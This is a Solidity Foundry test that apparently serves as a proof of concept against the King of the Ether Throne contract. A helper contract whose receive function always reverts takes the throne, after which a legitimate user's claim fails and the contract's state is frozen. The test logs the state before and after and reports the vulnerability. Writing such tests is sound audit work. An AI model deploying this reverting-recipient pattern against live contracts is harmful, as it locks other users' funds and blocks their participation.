// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/king_of_the_ether_throne.sol";

contract KingOfTheEtherThroneTest is Test {
    KingOfTheEtherThrone throne;
    RejectingContract rejectingMonarch;
    address constant LEGIT_USER = address(0x999);

    function setUp() public {
        throne = new KingOfTheEtherThrone();
        
        // Deploy and fund rejecting monarch contract
        rejectingMonarch = new RejectingContract();
        uint claimPrice = throne.currentClaimPrice();
        vm.deal(address(rejectingMonarch), claimPrice);
        
        // rejectingMonarch becomes second monarch
        vm.prank(address(rejectingMonarch));
        rejectingMonarch.becomeMonarch(address(throne), "RejectingMonarch", claimPrice);
    }

    function testThroneClaimRevertsDueToRejectingAddress() public {
        // Pre-attack state snapshot
        console2.log("--- BEFORE-ATTACK STATE ---");
        (address currentMonarchAddrBefore, , , ) = throne.currentMonarch();
        uint claimPriceBefore = throne.currentClaimPrice();
        uint monarchCountBefore = throne.numberOfMonarchs();
        
        console2.log("Current monarch address:", currentMonarchAddrBefore);
        console2.log("Claim price before:", claimPriceBefore);
        console2.log("Total monarchs count before:", monarchCountBefore);
        console2.log("");

        console2.log("--- EXECUTING ATTACK (reverting claim attempt) ---");
        // Prepare for legitimate claim
        uint claimPrice = throne.currentClaimPrice();
        vm.deal(LEGIT_USER, claimPrice * 2);
        
        // Claim reverts due to rejecting contract's receive function
        vm.prank(LEGIT_USER);
        vm.expectRevert();
        throne.claimThrone{value: claimPrice}("Legitimate User");

        // Post-attack state snapshot
        console2.log("--- AFTER-ATTACK STATE ---");
        (address currentMonarchAddrAfter, , , ) = throne.currentMonarch();
        uint claimPriceAfter = throne.currentClaimPrice();
        uint monarchCountAfter = throne.numberOfMonarchs();
        
        console2.log("Current monarch address:", currentMonarchAddrAfter);
        console2.log("Claim price after:", claimPriceAfter);
        console2.log("Total monarchs count after:", monarchCountAfter);
        
        // Compare states
        console2.log("");
        console2.log("--- DIFFERENTIAL COMPARISON ---");
        bool monarchUnchanged = currentMonarchAddrBefore == currentMonarchAddrAfter;
        bool priceUnchanged = claimPriceBefore == claimPriceAfter;
        bool countUnchanged = monarchCountBefore == monarchCountAfter;
        bool stateFrozen = monarchUnchanged && priceUnchanged && countUnchanged;
        
        console2.log("Monarch unchanged:", monarchUnchanged);
        console2.log("Claim price unchanged:", priceUnchanged);
        console2.log("Monarch count unchanged:", countUnchanged);
        
        // Final vulnerability verdict
        if (stateFrozen) {
            console2.log("Vulnerability Exists: Throne state frozen after legitimate claim reverted");
        } else {
            console2.log("Vulnerability not Exist: Legitimate claim succeeded after state change");
        }
    }
}

contract RejectingContract {
    function becomeMonarch(address throneAddress, string memory nameToUse, uint256 amount) external payable {
        KingOfTheEtherThrone(payable(throneAddress)).claimThrone{value: amount}(nameToUse);
    }

    // Minimal revert to ensure it works with 2300 gas
    receive() external payable {
        revert();
    }
}